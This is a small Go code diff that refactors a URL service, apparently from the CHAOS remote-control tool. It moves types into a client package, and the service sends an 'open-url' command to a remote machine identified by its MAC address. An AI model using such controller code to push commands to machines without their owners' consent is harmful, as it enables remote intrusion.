@@ -1,17 +1,18 @@
-package services
+package url
 
 import (
 	"context"
 	"fmt"
+	"github.com/tiagorlampert/CHAOS/services/client"
 	"net/url"
 	"strings"
 )
 
 type urlService struct {
-	Client
+	client.Service
 }
 
-func NewUrlService(clientService Client) Url {
+func NewUrlService(clientService client.Service) Service {
 	return &urlService{clientService}
 }
 
@@ -23,7 +24,7 @@ func (u urlService) OpenUrl(ctx context.Context, address string, rawUrl string) 
 	if err != nil {
 		return err
 	}
-	if _, err := u.SendCommand(ctx, SendCommandInput{
+	if _, err := u.SendCommand(ctx, client.SendCommandInput{
 		MacAddress: address,
 		Request:    fmt.Sprintf("open-url %s", urlStr.String()),
 	}); err != nil {
